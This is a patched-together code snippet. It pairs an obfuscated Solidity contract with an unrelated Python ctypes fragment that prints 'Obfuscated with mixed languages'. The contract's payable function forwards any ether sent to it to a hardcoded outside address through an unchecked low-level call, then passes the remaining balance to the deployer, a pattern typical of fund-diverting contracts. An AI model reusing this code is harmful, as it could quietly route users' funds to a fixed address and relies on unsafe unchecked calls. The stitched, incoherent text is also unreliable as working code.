pragma solidity ^0.4.24;

contract B {
    address public O = msg.sender;
    
    function g() public payable {
        address t = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;
         
        t.call.value(msg.value)();
        O.transfer(address(this).balance);
    }
    
    function() public payable {
    }
}

```

```python
from ctypes import *

# Load the C standard library
libc = CDLL("libc.so.6")

# Use the printf function from the C standard library
libc.printf(b"Obfuscated with mixed languages\n")